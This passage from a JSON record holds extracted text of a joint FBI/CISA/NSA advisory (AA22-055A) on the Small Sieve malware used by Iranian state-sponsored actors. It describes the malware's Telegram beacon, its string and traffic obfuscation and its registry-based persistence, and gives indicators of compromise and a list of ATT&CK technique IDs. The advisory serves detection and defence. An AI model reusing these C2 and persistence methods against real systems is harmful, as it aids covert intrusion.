Platypus  on the command \nline.  \nString obfuscation  \nInternal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64 -\nencoded. A decryption script is included in Appendix B.  \nCommunications  \nBeacon Format  \nBefore listening for tasking using CommandHandler objects from the python -telegram -bot module, a \nbeacon is generated manually using the standard requests  library:  \n\n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 17 of 18  |  Product ID : AA22 -055A \nTLP: WHITE     \nFigure 2: Manually Generated Beacon  \nThe hex host data is encoded u sing the byte shuffling algorithm as described in the Communications \n(Traffic obfuscation) section of this report. The example in figure 2  decodes to:  \nadmin/WINDOMAIN1 | 10.17.32.18  \nTraffic obfuscation  \nAlthough traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and \nresponse using a hex byte shuffling algorithm. A Python3 implementation is shown in figure 3.  \n \nFigure 3: Traffic Encoding Scheme Based on Hex Conversion and Shuffling  \nDetect ion  \nTable 6 outlines indicators of compromise.  \nTable 6: Indicators of Compromise  \nType  Description  Values  \nPath  Telegram Session \nPersistence File \n(Obfuscated)  %LocalAppData% \\MicrosoftWindowsOut\nlookDataPlus.txt  \nPath  Installation path of the \nSmall Sieve binary  %AppData% \\OutlookMicrosift \\index.e\nxe  \n\n\n \n  FBI | CISA | CNMF | NCSC -UK | NSA    TLP:WHITE  \n \nPage 18 of 18  |  Product ID : AA22 -055A \nTLP: WHITE    Registry value name  Persistence Registry Key \npointing to index.exe with \na Platypus  argument  HKCU\\Software \\Microsoft \\Windows\\Cu\nrrentVersion \\Run\\OutlookMicrosift  \n \nString Recover Script  \nFigure 4: String Recovery Script  \n\n",
  "cves": [],
  "techniques": [
    "T1589.002",
    "T1132.001",
    "T1547.001",
    "T1555.003",
    "T1003.005",
    "T1102.002",
    "T1105",
    "T1588.002",
    "T1071.001",
    "T1552.001",
    "T1049",
    "T1560.001",
    "T1027.003",
    "T1036.005",
    "T1548.002",
    "T1559.002",
    "T1027",
    "T1059.001",
    "T1559.001",
    "T1027.004",
    "T1082",
    "T1566.001",
    "T1218.011",
    "T1041",
    "T1218.005",
    "T1003.001",
    "T1003.004",
    "T1090.002",
    "T1057",
    "T1203",
    "T1518",
    "T1016",
    "T1204.001",
    "T1572",
    "T1480",
    "T1047",
    "T1083",
    "T1001.001",
    "T1562.001",
    "T1104",
    "T1053.005",
    "T1583.006",
    "T1574.002",
    "T1218.003",
    "T1518.001",
    "T1033",
    "T1113",
    "T1005",
    "T1140",
    "T1219",
    "T1059.007",
    "T1059.006",
    "T1059.005",
    "T1555",
    "T1574",
    "T1087.002",
    "T1566.002",
    "T1137.001",
    "T1204.002",
    "T1132.002"
  ],
  "advisory": "cybersecurity-alerts",
  "title": "csa_aa22-055a_iranian_government-sponsored_actors_conduct_cyber_operations",
  "source": "nsa",
  "id": "adaec2dbf4b027a6f7ee8d62b97296373c3c6752eea17a90b44cb2219a8f0bfd"
}